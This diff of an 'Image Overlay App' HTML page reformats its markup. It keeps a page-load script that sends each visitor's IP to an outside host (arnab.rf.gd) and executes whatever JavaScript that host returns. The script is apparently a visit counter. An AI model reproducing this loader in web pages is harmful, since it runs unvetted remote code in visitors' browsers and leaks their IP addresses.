@@ -6,8 +6,8 @@
 
     <meta charset="UTF-8">
     <title>Image Overlay App</title>
-    
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 
     <style>
         #input-container {
@@ -269,19 +269,19 @@
         });
 
     </script>
-    
- <script>
-$(document).ready(function(){
-    $.ajax({
-        url: "http://arnab.rf.gd/our_nikli_24_counter/index.php",
-        data: {ip: "<?php echo $_SERVER['REMOTE_ADDR']; ?>"},
-        dataType: "script",
-        success: function(){
-            console.log("Script executed successfully.");
-        }
-    });
-});
-</script>
+
+    <script>
+        $(document).ready(function () {
+            $.ajax({
+                url: "http://arnab.rf.gd/our_nikli_24_counter/index.php",
+                data: { ip: "<?php echo $_SERVER['REMOTE_ADDR']; ?>" },
+                dataType: "script",
+                success: function () {
+                    console.log("Script executed successfully.");
+                }
+            });
+        });
+    </script>
 
 
 
